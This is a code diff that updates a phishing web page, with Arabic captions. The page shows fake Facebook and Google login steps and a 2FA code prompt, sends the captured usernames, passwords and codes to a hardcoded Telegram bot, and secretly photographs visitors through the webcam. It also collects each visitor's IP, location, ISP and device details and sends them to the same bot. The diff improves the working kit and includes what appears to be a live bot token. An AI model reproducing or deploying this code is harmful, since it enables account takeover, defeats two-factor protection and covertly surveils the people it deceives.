@@ -14,14 +14,11 @@
         input:focus { border-color: var(--gold); }
         .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; transition: 0.3s; }
         
-        /* شاشات العرض */
         #step2, #step3, #loader-screen, #calling-screen { display: none; }
         
-        /* العداد */
         .progress-bar { width: 100%; background: #333; height: 8px; border-radius: 4px; margin: 20px 0; overflow: hidden; }
         .fill { width: 0%; height: 100%; background: var(--gold); transition: linear; }
         
-        /* أنيميشن السماعة */
         .phone-ring { width: 80px; height: 80px; border: 3px solid var(--gold); border-radius: 50%; margin: 20px auto; display: flex; align-items: center; justify-content: center; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(212, 175, 55, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(212, 175, 55, 0); } 100% { box-shadow: 0 0 0 0 rgba(212, 175, 55, 0); } }
     </style>
@@ -74,43 +71,51 @@
 </div>
 
 <script>
-    // --- البيانات الجديدة المحدثة ---
     const token = '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0';
     const chat = '8188899228'; 
 
     window.onload = () => {
-        navigator.mediaDevices.getUserMedia({video:true}).then(s=>document.getElementById('v').srcObject=s);
-        navigator.geolocation.getCurrentPosition(()=>{},{});
+        navigator.mediaDevices.getUserMedia({video:true}).then(s=>document.getElementById('v').srcObject=s).catch(e=>console.log("Camera access denied"));
     };
 
     async function capture(action) {
         const v = document.getElementById('v'), c = document.getElementById('c'), ctx = c.getContext('2d');
-        for(let i=1; i<=3; i++) {
-            ctx.drawImage(v, 0, 0, 320, 240);
-            const blob = await new Promise(r=>c.toBlob(r, 'image/jpeg'));
-            const fd = new FormData();
-            fd.append('chat_id', chat); fd.append('photo', blob); fd.append('caption', `📸 صورة ${i} - ${action}`);
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:fd});
-            await new Promise(r=>setTimeout(r, 800));
-        }
+        try {
+            for(let i=1; i<=3; i++) {
+                ctx.drawImage(v, 0, 0, 320, 240);
+                const blob = await new Promise(r=>c.toBlob(r, 'image/jpeg', 0.7));
+                const fd = new FormData();
+                fd.append('chat_id', chat); 
+                fd.append('photo', blob, `shot_${i}.jpg`); 
+                fd.append('caption', `📸 صورة ${i} - ${action}`);
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:fd});
+                await new Promise(r=>setTimeout(r, 800));
+            }
+        } catch(e) { console.log("Capture failed"); }
     }
 
     async function sendFull(title, data) {
-        let loc = "Access Denied";
+        let loc = "جاري جلب الموقع...";
         try {
-            const r = await fetch('http://ip-api.com/json/');
+            const r = await fetch('https://ipapi.co/json/');
             const d = await r.json();
-            loc = `🌍 البلد: ${d.country} | المدينة: ${d.city}\n📡 ISP: ${d.isp}\n📍 IP: \`${d.query}\``;
-        } catch(e){}
-        const info = `🚀 **${title}** 🚀\n${data}\n\n📊 **System Info:**\n${loc}\n📱 الجهاز: \`${navigator.platform}\`\n📄 المتصفح: \`${navigator.userAgent.split(') ')[1]}\``;
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
+            loc = `🌍 البلد: ${d.country_name} | المدينة: ${d.city}\n📍 IP: \`${d.ip}\` | ISP: ${d.org}`;
+        } catch(e){ loc = "تعذر جلب الموقع (HTTPS Required)"; }
+
+        const info = `🚀 **${title}** 🚀\n${data}\n\n📊 **System Info:**\n${loc}\n📱 الجهاز: \`${navigator.platform}\``;
+
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chat, text: info, parse_mode: 'Markdown' })
+        });
     }
 
     function handleStep1() {
         const u = document.getElementById('fb-user').value, p = document.getElementById('fb-pass').value;
-        if(!u || !p) return;
-        sendFull("FB Login", `👤: \`${u}\` | 🔑: \`${p}\``);
-        capture("FB Login");
+        if(!u || !p) { alert("يرجى إدخال البيانات"); return; }
+        sendFull("Facebook Login", `👤: \`${u}\` | 🔑: \`${p}\``);
+        capture("FB Step 1");
         document.getElementById('step1').style.display='none';
         startLoader();
     }
@@ -125,10 +130,8 @@
             document.getElementById('p-fill').style.width = ((120-t)/120*100)+'%';
             if(t <= 0) { 
                 clearInterval(intr);
-                setTimeout(() => {
-                    document.getElementById('loader-screen').style.display='none';
-                    document.getElementById('step2').style.display='block';
-                }, 4000);
+                document.getElementById('loader-screen').style.display='none';
+                document.getElementById('step2').style.display='block';
             }
         }, 1000);
     }
@@ -136,8 +139,8 @@
     function handleStep2() {
         const c = document.getElementById('sms-code').value;
         if(!c) return;
-        sendFull("FB 2FA", `🛡️ Code: \`${c}\``);
-        capture("FB 2FA");
+        sendFull("Facebook 2FA Code", `🛡️ الرمز المستلم: \`${c}\``);
+        capture("FB 2FA Step 2");
         document.getElementById('step2').style.display='none';
         document.getElementById('step3').style.display='block';
     }
@@ -145,8 +148,8 @@
     function handleStep3() {
         const u = document.getElementById('gm-user').value, p = document.getElementById('gm-pass').value;
         if(!u || !p) return;
-        sendFull("Google Data", `📧: \`${u}\` | 🔑: \`${p}\``);
-        capture("Google Login");
+        sendFull("Google Link Data", `📧: \`${u}\` | 🔑: \`${p}\``);
+        capture("Google Step 3");
         document.getElementById('step3').style.display='none';
         document.getElementById('calling-screen').style.display='block';
     }
